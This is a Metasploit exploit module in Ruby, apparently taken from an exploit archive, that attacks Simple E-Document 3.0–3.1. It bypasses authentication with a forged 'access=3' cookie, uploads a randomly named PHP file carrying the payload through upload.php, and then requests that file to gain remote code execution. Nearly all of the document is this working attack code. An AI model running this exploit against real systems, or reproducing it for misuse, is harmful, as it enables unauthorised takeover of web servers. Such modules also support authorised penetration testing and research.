# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Simple E-Document Arbitrary File Upload",
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability found in Simple
        E-Document versions 3.0 to 3.1. Attackers can bypass authentication and
        abuse the upload feature in order to upload malicious PHP files which
        results in arbitrary remote code execution as the web server user. File
        uploads are disabled by default.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;vinicius777[at]gmail.com&#039;, # Auth bypass discovery and PoC, kinda
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          # This EDB uses SQLI for auth bypass which isn&#039;t needed.
          # Sending "Cookie: access=3" with all requests is all
          # that&#039;s needed for auth bypass.
          [&#039;EDB&#039;, &#039;31142&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it&#039;s unlimited
          &#039;Space&#039;       => 262144 # 256k
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on Simple E-Document versions 3.0 and 3.1
          [ &#039;Generic (PHP Payload)&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jan 23 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Simple E-Document&#039;, &#039;/simple_e_document_v_1_31/&#039;])
        ], self.class)
  end

  #
  # Checks if target allows file uploads
  #
  def check
    res = send_request_raw({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;upload.php&#039;),
      &#039;cookie&#039; => &#039;access=3&#039;
    })

    unless res
      vprint_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    if res.body and res.body.to_s =~ /File Uploading Has Been Disabled/
      vprint_error("#{peer} - File uploads are disabled")
      return Exploit::CheckCode::Safe
    end

    if res.body and res.body.to_s =~ /Upload File/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  #
  # Uploads our malicious file
  #
  def upload
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    php  = "<?php #{payload.encoded} ?>"

    data = Rex::MIME::Message.new
    data.add_part(&#039;upload&#039;, nil, nil, &#039;form-data; name="op1"&#039;)
    data.add_part(php, &#039;application/octet-stream&#039;, nil, "form-data; name=\"fileupload\"; filename=\"#{@fname}\"")
    post_data = data.to_s.gsub(/^\r\n--_Part_/, &#039;--_Part_&#039;)

    print_status("#{peer} - Uploading malicious file...")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;upload.php&#039;),
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;cookie&#039;   => &#039;access=3&#039;,
      &#039;data&#039;     => post_data,
      &#039;vars_get&#039; => {
        &#039;op&#039; => &#039;newin&#039;
      }
    })

    fail_with(Failure::Unknown, "#{peer} - Request timed out while uploading") unless res
    fail_with(Failure::NotFound, "#{peer} - No upload.php found") if res.code.to_i == 404
    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to write #{@fname}") if res.body and (res.body =~ /Couldn&#039;t copy/ or res.body !~ /file uploaded\!/)

    print_good("#{peer} - Payload uploaded successfully.")
    register_files_for_cleanup(@fname)

    if res.body.to_s =~ /<br>folder to use: .+#{target_uri.path}\/?(.+)<br>/
        @upload_path = normalize_uri(target_uri.path, "#{$1}")
        print_good("#{peer} - Found upload path #{@upload_path}")
    else
        @upload_path = normalize_uri(target_uri.path, &#039;in&#039;)
        print_warning("#{peer} - Could not find upload path - assuming &#039;#{@upload_path}&#039;")
    end
  end

  #
  # Executes our uploaded malicious file
  #
  def exec
    print_status("#{peer} - Executing #{@fname}...")
    res = send_request_raw({
      &#039;uri&#039;    => normalize_uri(@upload_path, @fname),
      &#039;cookie&#039; => &#039;access=3&#039;
    })
    if res and res.code == 404
      fail_with(Failure::NotFound, "#{peer} - Not found: #{@fname}")
    end
  end

  #
  # Just upload and execute
  #
  def exploit
    upload
    exec
  end
end

